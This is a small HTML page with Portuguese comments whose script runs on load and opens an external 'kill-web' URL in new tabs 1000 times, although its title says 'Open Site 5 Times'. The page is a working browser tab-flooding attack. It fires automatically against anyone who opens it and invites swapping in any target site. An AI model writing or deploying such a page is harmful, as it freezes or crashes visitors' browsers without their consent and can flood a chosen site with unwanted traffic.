<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Open Site 5 Times</title>
    <script>
        function openSite() {
            const url = "https://cleiti6966.github.io/kill-web.github.io/"; // Substitua pelo site desejado
            for (let i = 0; i < 1000; i++) {
                // Abre o site em uma nova aba sem parâmetros extras
                const a = document.createElement("a");
                a.href = url;
                a.target = "_blank";
                a.click();
            }
        }

        // Executa a função ao carregar a página
        window.onload = openSite;
    </script>
</head>
<body>
    <h1>O site será aberto em novas abas</h1>
    <p>Aguarde enquanto os sites são carregados.</p>
</body>
</html>
